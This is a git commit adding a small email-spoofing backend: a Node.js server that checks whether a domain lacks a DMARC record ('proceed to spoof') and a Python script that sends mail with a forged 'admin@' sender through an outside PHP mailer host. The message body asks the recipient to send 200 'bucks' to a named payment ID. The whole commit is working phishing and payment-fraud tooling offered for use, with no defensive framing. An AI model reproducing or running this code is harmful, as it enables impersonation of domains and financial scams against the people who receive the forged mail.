a14e43802fad091db74ff4e097fa87d263110d37
hysteriya <126953127+hysteriya@users.noreply.github.com>
2023-06-01 00:01:00 +0530

    backend done

---
+++ dmarc.js
@@ -0,0 +1,60 @@
+const dmarc = require('dmarc-solution');
+const express= require('express');
+const app=express();
+const {PythonShell}=require('python-shell');
+//const nodemailer=require('nodemailer');
+
+
+app.use(express.json());
+app
+.post('/', dmarccheck)
+.get('/', mail);
+
+let domain='';
+let recieverMail='';
+let senderName='';
+
+async function dmarccheck(req, res) {
+    let object= req.body;
+    domain=object.domain;
+    recieverMail=object.mail;
+    senderName=object.name;
+
+    try{
+        const record= await dmarc.fetch(domain)
+        res.status(200).json({data: record});
+    }
+    catch(err){
+        res.status(404).json({error: 'dmarc not found. proceed to spoof'});
+    }
+}
+
+let senderMail= `admin@${domain}`;
+
+function mail(req, res){
+    try{
+        let options={
+            scriptPath: "C:/Users/riya5/OneDrive/Documents/projects/email spoof",
+            args:[senderName, senderMail, recieverMail]
+        }
+        PythonShell.run("spoof.py", options, (err, response)=>{
+            if (err){
+                console.log(err);
+            }
+            else{
+                console.log(response);
+                res.json({message: 'mail sent successfully'});
+            }
+        });   
+             
+    }
+    catch(err){
+        console.log(err);
+    }
+}
+
+
+
+app.listen(8080,()=>{
+    console.log("listening on port 8080");
+});
---
+++ spoof.py
@@ -0,0 +1,57 @@
+import os
+import sys
+import time
+from os import system
+from time import sleep
+
+try:
+    import requests
+except ImportError:
+    os.system('apt-get install python3')
+    os.system('pip3 install requests')
+
+try:
+	request = requests.get("https://www.google.com/search?q=cats", timeout=3)
+except (requests.ConnectionError, requests.Timeout) as exception:
+    print("[!] Oops, It looks like you have no Internet [!]")
+    sys.exit()
+
+import requests
+
+R = '\033[1;31m'
+G = '\033[1;32m'
+Y = '\033[1;33m'
+C = '\033[1;36m'
+W = '\033[1;37m'
+
+def hprint(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(8.0 / 100)
+
+
+
+
+hprint(G + ' Starting Spoof AnyMail for Sending Emails ...')
+
+print ("")
+name = sys.argv[1]
+sender = sys.argv[2]
+receiver = sys.argv[3]
+subject = (C + "Very Real Email" + Y + " --> " + G)
+body = (C + "Send 200 bucks to riya543216@oksbi to proceed" + Y + " --> " + G)
+
+
+files = {
+    'name': (None, name),
+    'subject': (None, subject),
+    'email': (None, receiver),
+    'from': (None, sender),
+    'message': (None, body),
+    'submit': (None, "submit"),
+}
+response = requests.post('https://chaffier-song.000webhostapp.com/send.php', files=files)
+hprint(C + ' Sending email to ' + receiver + ' ...')
+print("")
+print(G + " " + response.text)
